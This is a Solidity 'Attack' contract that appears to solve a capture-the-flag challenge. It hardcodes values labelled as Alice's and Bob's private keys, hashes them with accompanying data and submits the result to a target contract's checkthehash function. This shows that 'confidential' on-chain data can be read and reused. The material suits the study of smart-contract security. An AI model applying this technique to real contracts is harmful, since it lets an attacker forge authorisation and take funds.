// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

interface Iconfidential{
  function hash(bytes32 key1, bytes32 key2) external pure returns (bytes32);
  function checkthehash(bytes32 _hash) external view returns(bool);
}

contract Attack {

  Iconfidential target;
  bytes32 public result;

  constructor(address _target) {

    target = Iconfidential(_target);  
    bytes32 ALICE_PRIVATE_KEY = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    bytes32 ALICE_DATA = "QWxpY2UK";
    bytes32 BOB_PRIVATE_KEY = 0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6;
    bytes32 BOB_DATA = "Qm9iCg";

    bytes32 aliceHash = keccak256(abi.encodePacked(ALICE_PRIVATE_KEY,ALICE_DATA));
    bytes32 bobHash = keccak256(abi.encodePacked(BOB_PRIVATE_KEY,BOB_DATA));

    result = target.hash(aliceHash, bobHash);

    check(result);
  }

  function check(bytes32 _result) public view returns(bool){
    require(target.checkthehash(_result), "Not Hacked!");
    return true;
  }
}
